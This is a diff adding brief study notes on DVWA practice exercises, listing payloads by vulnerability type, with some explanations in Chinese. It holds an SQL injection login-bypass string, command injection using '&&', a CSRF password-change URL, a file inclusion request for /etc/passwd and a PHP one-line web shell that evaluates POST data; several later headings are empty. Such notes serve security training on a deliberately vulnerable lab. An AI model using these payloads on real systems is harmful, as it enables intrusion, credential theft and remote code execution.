@@ -1,0 +1,37 @@
+
+https://blog.csdn.net/qq_29277155/article/details/52726730
+
+
+Brute Force
+	burpsuite
+	admin' or 1=1 limit 1 -- +
+	
+Command Injection
+	127.0.0.1
+	127.0.0.1 && ifconfig
+	127.0.0.1 && pwd
+		command1 && command2   先执行command1后执行command2
+		command1 | command2    只执行command2
+		command1 & command2    先执行command2后执行command1
+	
+CSRF
+	http://1.117.162.201/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#
+	
+File Inclusion
+	http://1.117.162.201/dvwa/vulnerabilities/fi/?page=/etc/passwd
+	http://1.117.162.201/dvwa/vulnerabilities/fi/?page=/var/www/html/phpinfo.php
+	
+	
+File Upload
+	<?php @eval($_POST["password"]);?>
+	http://1.117.162.201/dvwa/hackable/uploads/1.php
+
+Insecure CAPTCHA
+SQL Injection
+SQL Injection (Blind)
+Weak Session IDs
+XSS (DOM)
+XSS (Reflected)
+XSS (Stored)
+CSP Bypass
+JavaScript
